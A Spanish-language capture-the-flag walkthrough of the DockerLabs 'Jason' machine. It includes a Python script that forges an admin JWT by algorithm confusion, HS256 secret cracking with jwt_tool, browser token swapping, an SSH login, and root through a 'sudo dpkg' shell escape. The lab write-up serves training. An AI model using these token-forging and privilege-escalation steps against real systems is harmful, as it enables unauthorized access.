---
icon: flag
---

# Jason DockerLabs (Intermediate)

## Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip jason.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh jason.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-07 09:50 CET
Nmap scan report for 172.17.0.2
Host is up (0.000066s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 10.0p2 Debian 7 (protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.13.5)
|_http-title: JWT Lab - Login
|_http-server-header: Werkzeug/3.0.1 Python/3.13.5
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.24 seconds
```

Veremos que hay un puerto `5000` alojando una pagina web creada por `python3` con la tecnologia `Flask`, vamos a entrar dentro de dicha pagina a ver que vemos.

```
URL = http://<IP>:5000/
```

Veremos un `login`, tambien vemos que podremos crear una cuenta en la pagina, por lo que vamos a crear una cuenta, hecho esto iniciaremos sesion con dichas credenciales, entrando dentro de forma autenticada veremos un `dashboard` normal, pero vemos que esta jugando con los `TOKENs JWT`, si empezamos a probar rutas por defecto relacionadas con este `JWT` veremos esta bastante interesante que esta por defecto.

## Nivel 1

```
URL = http://<IP>:5000/.well-known/jwks.json
```

Info:

```json
{
  "keys": [
    {
      "alg": "RS256",
      "kid": "jwt-lab-key-2024",
      "kty": "RSA",
      "use": "sig",
      "x5c": [
        "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF0MlFzSlR0VTBaakxNUnVTQlZFMApWN1o1YlpBRVlRbmcxM2paOE9yK2J3a0Q4MXI1R1c2cS82Q0M3M3lYakxjVGJBNmFlRzRzQ28rZFFGNDVlN0M0CktTRllERWdQeXZieVBDVmR2WnNGeW5qU1JJaUdzcFJTV3p5UXBub2UzdndDOEZ5M1gvTjJDOFhzY05IK0hOYzQKMDhreHJEcUpGUVVnQTY3ZGRkZDdJT2FiRngyNjI1Q3Fhd1RxRnEvVUhpYlZHeDRWZVRaQ0hoSEprVk9Xd2NYKwpFcFpUZFZlM3l2dko2UzdhTXpWZmdoWW5zNEQzbWM1ckx0U3ZnQzlkb011NDdwSDEyZU1ZSTVEeWUxanFReVhKCkxRT0Y4K2lMOFdWZ1FTeXhhNU1STWJVK0pkOHpLMWpmNXh6RFF5VDZLd2ZzT2JRS2YzaWl4cWRYRGpmZ1lERjYKRHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=="
      ]
    }
  ]
}
```

Veremos que podremos explotar el `algorithm confusion` ya que si decodificamos eso veremos que tiene consigo una clave publica.

```shell
echo 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF0MlFzSlR0VTBaakxNUnVTQlZFMApWN1o1YlpBRVlRbmcxM2paOE9yK2J3a0Q4MXI1R1c2cS82Q0M3M3lYakxjVGJBNmFlRzRzQ28rZFFGNDVlN0M0CktTRllERWdQeXZieVBDVmR2WnNGeW5qU1JJaUdzcFJTV3p5UXBub2UzdndDOEZ5M1gvTjJDOFhzY05IK0hOYzQKMDhreHJEcUpGUVVnQTY3ZGRkZDdJT2FiRngyNjI1Q3Fhd1RxRnEvVUhpYlZHeDRWZVRaQ0hoSEprVk9Xd2NYKwpFcFpUZFZlM3l2dko2UzdhTXpWZmdoWW5zNEQzbWM1ckx0U3ZnQzlkb011NDdwSDEyZU1ZSTVEeWUxanFReVhKCkxRT0Y4K2lMOFdWZ1FTeXhhNU1STWJVK0pkOHpLMWpmNXh6RFF5VDZLd2ZzT2JRS2YzaWl4cWRYRGpmZ1lERjYKRHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg' | base64 -d > public.key
```

Info:

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAt2QsJTtU0ZjLMRuSBVE0
V7Z5bZAEYQng13jZ8Or+bwkD81r5GW6q/6CC73yXjLcTbA6aeG4sCo+dQF45e7C4
KSFYDEgPyvbyPCVdvZsFynjSRIiGspRSWzyQpnoe3vwC8Fy3X/N2C8XscNH+HNc4
08kxrDqJFQUgA67dddd7IOabFx2625CqawTqFq/UHibVGx4VeTZCHhHJkVOWwcX+
EpZTdVe3yvvJ6S7aMzVfghYns4D3mc5rLtSvgC9doMu47pH12eMYI5Dye1jqQyXJ
LQOF8+iL8WVgQSyxa5MRMbU+Jd8zK1jf5xzDQyT6KwfsObQKf3iixqdXDjfgYDF6
DwIDAQAB
-----END PUBLIC KEY-----
```

Vamos a guardar esta clave publica en un archivo.

```shell
echo 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF0MlFzSlR0VTBaakxNUnVTQlZFMApWN1o1YlpBRVlRbmcxM2paOE9yK2J3a0Q4MXI1R1c2cS82Q0M3M3lYakxjVGJBNmFlRzRzQ28rZFFGNDVlN0M0CktTRllERWdQeXZieVBDVmR2WnNGeW5qU1JJaUdzcFJTV3p5UXBub2UzdndDOEZ5M1gvTjJDOFhzY05IK0hOYzQKMDhreHJEcUpGUVVnQTY3ZGRkZDdJT2FiRngyNjI1Q3Fhd1RxRnEvVUhpYlZHeDRWZVRaQ0hoSEprVk9Xd2NYKwpFcFpUZFZlM3l2dko2UzdhTXpWZmdoWW5zNEQzbWM1ckx0U3ZnQzlkb011NDdwSDEyZU1ZSTVEeWUxanFReVhKCkxRT0Y4K2lMOFdWZ1FTeXhhNU1STWJVK0pkOHpLMWpmNXh6RFF5VDZLd2ZzT2JRS2YzaWl4cWRYRGpmZ1lERjYKRHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg' | base64 -d > public.key
```

Hecho esto vamos a crear un script para generar el `TOKEN` con el `rol` del `admin` y asi poderlo modificar desde la consola web.

### Algorithm Confusion

> generateJWT.py

```python
import json
import base64
import hmac
import hashlib

# Cargar clave pública
with open("public.key", "r") as f:
    public_key = f.read()

# Datos originales del usuario
header = {
    "typ": "JWT",
    "alg": "HS256"  # Cambiado de RS256 a HS256
}

payload = {
    "user_id": 5,
    "username": "diseo",
    "role": "admin",  # Cambiado de user a admin
    "exp": 1765101826
}

# Función para codificar en base64url
def base64url_encode(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':')).encode()
    encoded = base64.b64encode(data).decode()
    return encoded.replace('+', '-').replace('/', '_').replace('=', '')

# Crear partes del token
header_b64 = base64url_encode(header)
payload_b64 = base64url_encode(payload)

# Crear firma HMAC-SHA256 con la clave pública como secreto
message = f"{header_b64}.{payload_b64}".encode()
signature = hmac.new(public_key.encode(), message, hashlib.sha256).digest()
signature_b64 = base64url_encode(signature)

# Token final
token = f"{header_b64}.{payload_b64}.{signature_b64}"

print("Token forjado con role=admin:")
print(token)
```

El `payload` lo sabremos ejecutando el siguiente comando en la consola web.

```javascript
localStorage.getItem('jwt_token')
```

Info:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImRpc2VvIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjUxMDE4MjZ9.PmToZEDAaBtORwZcwiLdVveivC2ytojwel0H3CiQyjNYbAy5JyfGo3OHbprrQ3gAGFp7MAMe8dtDrOuNvmFXAoA-u9EKm_9W_i_C-B8soRqey4KnLhPlDVhhua3ITXIJGoPQK4x17WXsEU2Trt0oe2gQYYymOpXS3QbJNojqAXC0RMwkxum22xiqK1Zrj7URka206KfBeX8lHpbuqkdNNH_z9UhNf-FO1t92t8943GUYO4L09NU-HEmyUBHIg6KWzQuBytHarziy1U7VM7PXrJteopDbB45xSA18g59y862Nsv9TAwR5JRPyhEm6ZCIBLvfunh4i3iIOew7wK5_81g
```

Ahora vamos a generar un archivo para decodificar todo esto y poder leer el contenido de como esta formado:

> readTOKEN.py

```python
import base64
import json

token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImRpc2VvIiwicm9sZSI6InVzZXIiLCJleHAiOjE3NjUxMDE4MjZ9.PmToZEDAaBtORwZcwiLdVveivC2ytojwel0H3CiQyjNYbAy5JyfGo3OHbprrQ3gAGFp7MAMe8dtDrOuNvmFXAoA-u9EKm_9W_i_C-B8soRqey4KnLhPlDVhhua3ITXIJGoPQK4x17WXsEU2Trt0oe2gQYYymOpXS3QbJNojqAXC0RMwkxum22xiqK1Zrj7URka206KfBeX8lHpbuqkdNNH_z9UhNf-FO1t92t8943GUYO4L09NU-HEmyUBHIg6KWzQuBytHarziy1U7VM7PXrJteopDbB45xSA18g59y862Nsv9TAwR5JRPyhEm6ZCIBLvfunh4i3iIOew7wK5_81g'

parts = token.split('.')
header = json.loads(base64.urlsafe_b64decode(parts[0] + '=' * (-len(parts[0]) % 4)))
payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=' * (-len(parts[1]) % 4)))

print("Header:", json.dumps(header, indent=2))
print("\nPayload:", json.dumps(payload, indent=2))
```

Vamos a ejecutar el script de esta forma:

```shell
python3 readTOKEN.py
```

Info:

```
Header: {
  "typ": "JWT",
  "alg": "RS256"
}

Payload: {
  "user_id": 5,
  "username": "diseo",
  "role": "user",
  "exp": 1765101826
}
```

Sabiendo esto podemos crear el script de `generateJWT` y poder hacer un buen `payload`, por lo que ahora vamos a ejecutarlo de esta forma:

```shell
python3 generateJWT.py
```

Info:

```
Token forjado con role=admin:
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImRpc2VvIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzY1MTAxODI2fQ.xiW_VJU8ljaqbKIU7yo-ekcdjHwsF5M0n5FcaByE_iU
```

Ahora teniendo este `TOKEN` vamos a ejecutar el siguiente codigo en la consola web para modificar el `TOKEN` con el que hemos generado.

```javascript
localStorage.setItem('jwt_token', 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjo1LCJ1c2VybmFtZSI6ImRpc2VvIiwicm9sZSI6ImFkbWluIiwiZXhwIjoxNzY1MTAxODI2fQ.xiW_VJU8ljaqbKIU7yo-ekcdjHwsF5M0n5FcaByE_iU');
console.log('Token guardado:', localStorage.getItem('jwt_token'));
window.location.href = '/admin';
```

Si ejecutamos esto anterior veremos lo siguiente en la pagina.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-07 103919.png" alt=""><figcaption></figcaption></figure>

Veremos que ha funcionado de forma correcta, por lo que vamos acceder al nivel `2`.

## Escalate user jason

### Nivel 2

Si entramos dentro del nivel `2` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-07 105240.png" alt=""><figcaption></figcaption></figure>

Si entramos dentro de forma `logueada` como `invitado` veremos que tenemos un `rol` sin privilegios, pero nuestro objetivo es obtener un `rol` con privilegios.

Si investigamos el `Storage` del navegador web, veremos en la seccion de `Cookies` una llamada `level2_token` que contiene lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-07 105932.png" alt=""><figcaption></figcaption></figure>

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdF91c2VyIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzY1MTAxMTc4LCJleHAiOjE3NjUxMDQ3Nzh9.zs_h1CfFuG5bYeBm8AqK6P89a9kgYeFE0ASqJDRJsoA
```

Vamos a decodificarlo utilizando `python3` de esta forma:

```shell
python3 -c "
import base64, json
token = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdF91c2VyIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzY1MTAxMTc4LCJleHAiOjE3NjUxMDQ3Nzh9.zs_h1CfFuG5bYeBm8AqK6P89a9kgYeFE0ASqJDRJsoA'
parts = token.split('.')
header = json.loads(base64.b64decode(parts[0] + '=' * (-len(parts[0]) % 4)))
payload = json.loads(base64.b64decode(parts[1] + '=' * (-len(parts[1]) % 4)))
print('Header:', json.dumps(header, indent=2))
print('Payload:', json.dumps(payload, indent=2))
print()
print('Usuario:', payload.get('sub'))
print('Rol:', payload.get('role'))
"
```

Info:

```
Header: {
  "typ": "JWT",
  "alg": "HS256"
}
Payload: {
  "sub": "guest_user",
  "role": "guest",
  "iat": 1765101178,
  "exp": 1765104778
}

Usuario: guest_user
Rol: guest
```

Vemos que tenemos el `rol` `guest`, vamos a probar a generar uno con el `rol` de `admin`, pero antes tendremos que intentar `crackear` la clave secreta del `TOKEN` y despues con el formarlo:

```shell
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool
pip3 install -r requirements.txt
python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdF91c2VyIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzY1MTAyMDkzLCJleHAiOjE3NjUxMDU2OTN9.FTJTs946XYkINTwRylUn3Uo50fhuvoYDPndcHmqXL2E" -C -d /usr/share/wordlists/rockyou.txt
```

Info:

```
       \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi

/root/.jwt_tool/jwtconf.ini
Original JWT:

[+] secret123 is the CORRECT key!
You can tamper/fuzz the token contents (-T/-I) and sign it using:
python3 jwt_tool.py [options here] -S hs256 -p "secret123"
```

Veremos que ha funcionado, por lo que vamos a generar dicho `TOKEN` de esta forma:

```shell
python3 jwt_tool.py "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJndWVzdF91c2VyIiwicm9sZSI6Imd1ZXN0IiwiaWF0IjoxNzY1MTAyMDkzLCJleHAiOjE3NjUxMDU2OTN9.FTJTs946XYkINTwRylUn3Uo50fhuvoYDPndcHmqXL2E" -T -S hs256 -p "secret123"
```

Info:

```

        \   \        \         \          \                    \
   \__   |   |  \     |\__    __| \__    __|                    |
         |   |   \    |      |          |       \         \     |
         |        \   |      |          |    __  \     __  \    |
  \      |      _     |      |          |   |     |   |     |   |
   |     |     / \    |      |          |   |     |   |     |   |
\        |    /   \   |      |          |\        |\        |   |
 \______/ \__/     \__|   \__|      \__| \______/  \______/ \__|
 Version 2.3.0                \______|             @ticarpi

/root/.jwt_tool/jwtconf.ini
Original JWT:


====================================================================
This option allows you to tamper with the header, contents and
signature of the JWT.
====================================================================

Token header values:
[1] typ = "JWT"
[2] alg = "HS256"
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] sub = "guest_user"
[2] role = "guest"
[3] iat = 1765102431    ==> TIMESTAMP = 2025-12-07 11:13:51 (UTC)
[4] exp = 1765106031    ==> TIMESTAMP = 2025-12-07 12:13:51 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 2

Current value of role is: guest
Please enter new value and hit ENTER
> admin
[1] sub = "guest_user"
[2] role = "admin"
[3] iat = 1765102431    ==> TIMESTAMP = 2025-12-07 11:13:51 (UTC)
[4] exp = 1765106031    ==> TIMESTAMP = 2025-12-07 12:13:51 (UTC)
[5] *ADD A VALUE*
[6] *DELETE A VALUE*
[7] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 5
Please enter new Key and hit ENTER
> user
Please enter new value for user and hit ENTER
> admin
[1] sub = "guest_user"
[2] role = "admin"
[3] iat = 1765102431    ==> TIMESTAMP = 2025-12-07 11:13:51 (UTC)
[4] exp = 1765106031    ==> TIMESTAMP = 2025-12-07 12:13:51 (UTC)
[5] user = "admin"
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of sub is: guest_user
Please enter new value and hit ENTER
> admin_user
[1] sub = "admin_user"
[2] role = "admin"
[3] iat = 1765102431    ==> TIMESTAMP = 2025-12-07 11:13:51 (UTC)
[4] exp = 1765106031    ==> TIMESTAMP = 2025-12-07 12:13:51 (UTC)
[5] user = "admin"
[6] *ADD A VALUE*
[7] *DELETE A VALUE*
[8] *UPDATE TIMESTAMPS*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0
jwttool_cda91fe3391315ed0720d1855f197f07 - Tampered token - HMAC Signing:
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbl91c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY1MTAyNDMxLCJleHAiOjE3NjUxMDYwMzEsInVzZXIiOiJhZG1pbiJ9.Kects_x-Ta7LdBNNMSBP_GCOUlE6RTdnzkTxM8EokWk
```

Si investigamos los errores que nos da la pagina cuando creamos el `TOKEN` con los parametros por defecto que vienen veremos que requiere de un parametro extra llamado `user` que le pondremos como valor `admin` y lo demas lo cambiaremos de `guest` a `admin` creando el siguiente `TOKEN`.

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbl91c2VyIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzY1MTAyNDMxLCJleHAiOjE3NjUxMDYwMzEsInVzZXIiOiJhZG1pbiJ9.Kects_x-Ta7LdBNNMSBP_GCOUlE6RTdnzkTxM8EokWk
```

Ahora vamos a modificar el `TOKEN` desde el navegador web en la parte de `Storage` en la seccion de `Cookie`, borraremos el anterior y pondremos el nuevo, recargamos la pagina y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-12-07 111704.png" alt=""><figcaption></figcaption></figure>

Vemos que ha funcionado, por lo que vamos a conectarnos por `SSH` con dichas credenciales.

### SSH

```shell
ssh jason@<IP>
```

Metemos como contraseña `webtoken`...

```
Linux c8c956ab36b8 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
jason@c8c956ab36b8:~$ whoami
jason
```

Veremos que accedimos de forma correcta.

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for jason on c8c956ab36b8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User jason may run the following commands on c8c956ab36b8:
    (ALL) NOPASSWD: /usr/bin/dpkg
```

Vemos que podemos ejecutar el binario `dpkg` como el usuario `root`, por lo que podremos hacer lo siguiente para ser dicho usuario.

```shell
sudo dpkg -l
!/bin/bash
```

Info:

```
root@c8c956ab36b8:/home/jason# whoami
root
```

Veremos que ya seremos el usuario `root`, por lo que ya habremos terminado la maquina.
